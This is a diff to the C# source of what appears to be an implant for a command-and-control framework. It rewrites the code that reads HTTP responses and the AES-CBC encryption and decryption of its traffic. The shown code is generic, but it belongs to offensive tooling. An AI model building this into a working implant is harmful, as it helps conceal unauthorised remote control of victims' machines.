@@ -1,8 +1,6 @@
 using System;
-using System.Collections.Generic;
 using System.IO;
 using System.Net;
-using Newtonsoft.Json.Linq;
 using System.Security.Cryptography;
 using System.Text;
 
@@ -94,7 +92,12 @@ namespace NuagesSharpImplant
                 using (Stream responseStream = response.GetResponseStream())
                 {
                     MemoryStream ms = new MemoryStream();
-                    responseStream.CopyTo(ms);
+                    byte[] buffer = new byte[16384];
+                    int bytesRead;
+                    while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        ms.Write(buffer, 0, bytesRead);
+                    }
                     byte[] bytes = ms.ToArray();
                     return this.aes.DecryptString(bytes);
                 }
@@ -122,45 +125,58 @@ namespace NuagesSharpImplant
 
             public byte[] EncryptString(string message)
             {
-                var aes = new AesCryptoServiceProvider();
-                aes.Mode = CipherMode.CBC;
-                aes.KeySize = 256;
-                aes.Padding = PaddingMode.PKCS7;
-                byte[] iv = aes.IV;
-                using (var memStream = new System.IO.MemoryStream())
-                {
-                    memStream.Write(iv, 0, iv.Length);
-                    using (var cryptStream = new CryptoStream(memStream, aes.CreateEncryptor(this.key, aes.IV), CryptoStreamMode.Write))
+                byte[] encrypted;
+                using (Rijndael rijAlg = Rijndael.Create()) {
+                    rijAlg.Key = key;
+                    rijAlg.GenerateIV();
+                    rijAlg.Mode = CipherMode.CBC;
+                    rijAlg.Padding = PaddingMode.PKCS7;
+                    byte[] iv = rijAlg.IV;
+                    ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);
+                    using (MemoryStream msEncrypt = new MemoryStream())
                     {
-                        using (var writer = new System.IO.StreamWriter(cryptStream))
+                        msEncrypt.Write(iv, 0, iv.Length);
+                        using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                         {
-                            writer.Write(message);
+                            using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
+                            {
+                                swEncrypt.Write(message);
+                                swEncrypt.Flush();
+                            }
+                           encrypted = msEncrypt.ToArray();
                         }
                     }
-                    var buf = memStream.ToArray();
-                    return buf;
                 }
+                return encrypted;
             }
+                              
 
             public string DecryptString(byte[] bytes)
             {
-                //var bytes = Convert.FromBase64String(encryptedValue);
-                var aes = new AesCryptoServiceProvider();
-                aes.Mode = CipherMode.CBC;
-                aes.Padding = PaddingMode.PKCS7;
-                aes.KeySize = 256;
-                using (var memStream = new System.IO.MemoryStream(bytes))
+                string plaintext = null;
+                using (Rijndael rijAlg = Rijndael.Create())
                 {
-                    var iv = new byte[16];
-                    memStream.Read(iv, 0, 16);
-                    using (var cryptStream = new CryptoStream(memStream, aes.CreateDecryptor(this.key, iv), CryptoStreamMode.Read))
+                    rijAlg.Key = key;
+                    rijAlg.Mode = CipherMode.CBC;
+                    rijAlg.Padding = PaddingMode.PKCS7;
+
+                    using (MemoryStream msDecrypt = new MemoryStream(bytes))
                     {
-                        using (var reader = new System.IO.StreamReader(cryptStream))
+                        var iv = new byte[16];
+                        msDecrypt.Read(iv, 0, 16);
+                        rijAlg.IV = iv;
+                        ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
+
+                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                         {
-                            return reader.ReadToEnd();
+                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+                            {
+                                plaintext = srDecrypt.ReadToEnd();
+                            }
                         }
                     }
                 }
+                return plaintext;
             }
         }
     }
